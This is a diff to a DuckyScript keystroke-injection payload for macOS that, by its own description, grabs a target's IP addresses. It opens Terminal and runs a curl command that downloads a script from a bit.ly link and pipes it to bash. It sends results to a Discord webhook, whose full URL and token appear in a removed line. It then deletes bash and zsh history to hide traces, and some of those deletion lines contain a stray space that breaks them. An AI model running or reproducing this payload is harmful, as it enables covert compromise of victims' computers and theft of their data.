@@ -7,6 +7,40 @@ REM     Description: This payload is meant to do grab your targets IP addresses 
 REM     Target: OSx
 
 GUI SPACE
-DELAY 500
-STRING dc='https://discord.com/api/webhooks/1282822112100220938/pKwXqpV_QkhDb9CDVgGdbDPgyrkpcqPa7ODpfySQ5lro49uE3wHpuxVJa7X_ug5smJ93'; curl -sSL https://bit.ly/tstosx | bash
+DELAY 250
+STRING terminal
+DELAY 200
+ENTER
+DELAY 100
+
+REM     Delete anything that might have been typed in
+CTRL u
+REM     Run payload
+STRING export dc=''; curl -sSL https://bit.ly/tstosx | bash
+ENTER
+DELAY 200
+
+REM History deletion US keyboard
+REM clear terminal history
+STRING rm ~/.bash_history
+ENTER
+DELAY 100
+
+STRING rm ~/.zsh_history
+ENTER
+DELAY 100
+
+REM History deletion for International keyboard
+REM clear terminal history
+STRING rm ~ /.bash_history
+ENTER
+DELAY 100
+
+STRING rm ~ /.zsh_history
+ENTER
+DELAY 100
+
+
+REM close terminal
+GUI w
 ENTER
